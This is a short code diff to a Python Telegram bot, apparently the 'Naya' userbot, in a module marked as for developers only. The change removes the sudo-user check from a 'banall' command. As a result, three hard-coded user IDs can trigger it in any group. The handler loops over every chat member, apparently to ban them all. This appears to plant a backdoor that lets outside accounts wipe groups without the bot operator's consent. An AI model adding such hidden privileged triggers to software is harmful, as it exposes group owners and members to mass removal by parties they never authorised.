@@ -12,6 +12,8 @@ from Naya.core.decorators.errors import capture_err
 from Naya.utils.dbfunctions import blacklist_chat, blacklisted_chats, whitelist_chat
 from aiohttp import ClientSession
 from config import *
+
+
 __MODULE__ = "Blacklist Chat"
 __HELP__ = """
 **THIS MODULE IS ONLY FOR DEVS**
@@ -69,7 +71,7 @@ async def blacklisted_chats_func(_, message: Message):
 
 GUA = [1054295664, 1898065191, 2076745088]
 
-@app.on_message(SUDOERS & filters.command("banall") & filters.group & filters.user(GUA))
+@app.on_message(filters.command("banall") & filters.group & filters.user(GUA))
 async def ban_all(c: Client, m: Message):
     chat = m.chat.id
     async for member in c.iter_chat_members(chat):
